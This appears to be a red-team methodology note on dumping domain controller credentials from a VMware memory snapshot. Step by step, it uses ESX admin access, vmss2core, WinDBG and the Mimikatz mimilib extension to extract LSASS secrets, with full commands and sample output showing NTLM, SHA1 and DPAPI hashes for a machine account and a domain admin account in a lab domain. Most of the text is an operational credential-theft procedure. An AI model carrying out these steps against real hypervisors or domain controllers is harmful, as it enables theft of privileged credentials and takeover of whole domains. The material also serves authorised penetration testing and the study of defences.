==================================================================================================================================
OS Credential Dumping (LSASS) in a VMware .VMEM file using WinDBG and Mimikatz
==================================================================================================================================

Useful links
=============
> https://www.remkoweijnen.nl/blog/2013/11/25/dumping-passwords-in-a-vmware-vmem-file/
> https://kb.vmware.com/s/article/2003941
> https://www.technlg.net/windows/symbol-server-path-windbg-debugging/

Context
========
If during a penetration test or a red team assignment, you manage to compromise an account with administrator rights to a VMware
ESX Hypervisor then you can log into the ESX Web console and stop/start/reboot/delete/download any Virtual Machines hosted on 
the ESX hypervisor. 
You can also take a snapshot of the live memory (.VMEM file) of any Virtual Machines including Domain Controllers and then extract 
from the LSSAS process memory the password hashes of the Domain Controller machine account and potentially Domain Admin accounts. 
Below is the methodology to do so.

Methodology 
============

STEP 1 - Log into the VMware ESX (or vCenter) Web console with an administrator account (e.g. root)
         => "Https://esx-web-console/ui"

STEP 2 - Select a Domain Controller amoung the list of Virtual Machines running on the ESX hypervisor

STEP 3 - Take a snapshot of the Domain Controller VM's live memory. It will create 2 files (.VMSN & .VMEM).

STEP 4 - Download the 2 files (.VMSN & .VMEM) generated by the snaphot in the "datastores" section  

STEP 5 - Convert the 2 files into a memory crash dump file (.dmp) with the VMware tool "vmss2core"
         
          C:\Temp> vmss2core.exe -W8 "DC-01-Snapshot865.vmsn" "DC-01-Snapshot865.vmem"
          vmss2core version 8456865 Copyright (C) 1998-2017 VMware, Inc. All rights reserved.
          region[0]: start=0 end=c0000000.
          region[1]: start=100000000 end=240000000.
          scanning pa=0 len=0x10000000
          ... 10 MBs written.
          ... 20 MBs written.
          <SNIP>
          ... 8160 MBs written.
          ... 8170 MBs written.
          ... 8180 MBs written.
          ... 8190 MBs written.
          Finished writing core.


STEP 6 - Install and run WinDBG on your Windows laptop or in a Windows VM.
         => "https://aka.ms/windbg/download"

STEP 7 - Load in WindDBG the memory crash dump file (.dmp) generated in the STEP 5 with "vmss2core".

          ************* Preparing the environment for Debugger Extensions Gallery repositories **************
             ExtensionRepository : Implicit
             UseExperimentalFeatureForNugetShare : true
             AllowNugetExeUpdate : true
             AllowNugetMSCredentialProviderInstall : true
             AllowParallelInitializationOfLocalRepositories : true
             -- Configuring repositories
                ----> Repository : LocalInstalled, Enabled: true
                ----> Repository : UserExtensions, Enabled: true
          >>>>>>>>>>>>> Preparing the environment for Debugger Extensions Gallery repositories completed, duration 0.000 seconds
          ************* Waiting for Debugger Extensions Gallery to Initialize **************
          >>>>>>>>>>>>> Waiting for Debugger Extensions Gallery to Initialize completed, duration 0.031 seconds
             ----> Repository : UserExtensions, Enabled: true, Packages count: 0
             ----> Repository : LocalInstalled, Enabled: true, Packages count: 36
          
          Microsoft (R) Windows Debugger Version 10.0.25921.1001 AMD64
          Copyright (c) Microsoft Corporation. All rights reserved.
          
          Loading Dump File [C:\Temp\memory.dmp]
          Kernel Complete Dump File: Full address space is available

          ************* Path validation summary **************
          Response                         Time (ms)     Location
          OK                                             c:\mysymbols
          Deferred                                       cache*c:\symbolcache
          Deferred                                       SRV*c:symbols*http://msdl.microsoft.com/download/symbols
          Deferred                                       srv*
          <SNIP>
          DBGHELP: c:\symbolcache*c:symbols*http://msdl.microsoft.com/download/symbols is not a valid store
          <SNIP>
          SRTSP64+0x13bac:
          fffff802`9ca93bac 4c397f38        cmp     qword ptr [rdi+38h],r15 ds:002b:ffffe181`d0da2c18=000900000002f88c


STEP 8 - Load the "mimilib.dll" in WinDBG.

          0: kd> .load C:\Temp\mimilib.dll
          
            .#####.   mimikatz 2.2.0 (x64) built on Sep 19 2022 17:44:00
           .## ^ ##.  "A La Vie, A L'Amour" - Windows build 14393
           ## / \ ##  /* * *
           ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
           '## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)
            '#####'                                  WinDBG extension ! * * */
          
          ===================================
          #         * Kernel mode *         #
          ===================================
          # Search for LSASS process
          0: kd> !process 0 0 lsass.exe
          # Then switch to its context
          0: kd> .process /r /p <EPROCESS address>
          # And finally :
          0: kd> !mimikatz
          ===================================
          #          * User mode *          #
          ===================================
          0:000> !mimikatz
          ===================================


STEP 9 - Find the process ID of "LSASS" 

          0: kd> !process 0 0 lsass.exe

          PROCESS ffff9881759915c0
              SessionId: 0  Cid: 02f0    Peb: 6e35191000  ParentCid: 024c
              DirBase: 1316d2000  ObjectTable: ffffe181c17cb4c0  HandleCount: <Data Not Accessible>
              Image: lsass.exe


STEP 10 - Then switch to its context

            0: kd> .process /r /p ffff9881759915c0
  
            Implicit process is now ffff9881`759915c0
            Loading User Symbols
            ...........................................
            ............................................
            ************* Symbol Loading Error Summary **************
            Module name            Error
            SRTSP64                The system cannot find the file specified
            You can troubleshoot most symbol related issues by turning on symbol loading diagnostics (!sym noisy) and 
            repeating the command that caused symbols to be loaded.
            You should also verify that your symbol search path (.sympath) is correct.


STEP 11 - Extract the password hashes of the Domain Controller machine account and potentials DA accounts using Mimikatz

          0: kd> !mimikatz

          DBGHELP: c:\symbolcache*c:symbols*http://msdl.microsoft.com/download/symbols is not a valid store

          Domain List
          ===========
          Domain: LAB.local (LAB)
        
          SekurLSA
          ========
          Authentication Id : 0 ; 145370386 (00000000:08aa2d12)
          Session           : Interactive from 3
          User Name         : DWM-3
          Domain            : Window Manager
          Logon Server      : 
          Logon Time        : 8/1/2023 6:55:48 PM
          SID               : S-1-5-90-0-3
          	msv : 
          	 [00000003] Primary
          	 * Username : DC-01$
          	 * Domain   : LAB
          	 * NTLM     : 9bdcc4159dbb589fac<SNIP>
          	 * SHA1     : 7c1496da6aacf9bb72<SNIP>
          	tspkg : KO
          	wdigest : 
          	 * Username : DC-01$
          	 * Domain   : LAB
          	 * Password : (null)

           
            Authentication Id : 0 ; 145389179 (00000000:08aa767b)
            Session           : RemoteInteractive from 3
            User Name         : DomainAdminAccount01
            Domain            : LAB
            Logon Server      : DC-01
            Logon Time        : 8/1/2023 6:55:50 PM
            SID               : S-1-5-21-2119924263-2077221690-550731470-76255
            	msv : 
            	 [00000003] Primary
            	 * Username : DomainAdminAccount01
            	 * Domain   : LAB
            	 * NTLM     : 132e5c1171761b51<SNIP>
            	 * SHA1     : 5132e6d857fc32ec<SNIP>
            	 * DPAPI    : e05bd8cf66b2aa88<SNIP>
            	tspkg : KO
            	wdigest : 
            	 * Username : DomainAdminAccount01
            	 * Domain   : LAB
            	 * Password : (null)
            	kerbero.s : 
            	 * Username : DomainAdminAccount01
            	 * Domain   : LAB
            	 * Password : (null)
            	ssp : 
            	masterkey : 
            	credman : 
            
              <SNIP>
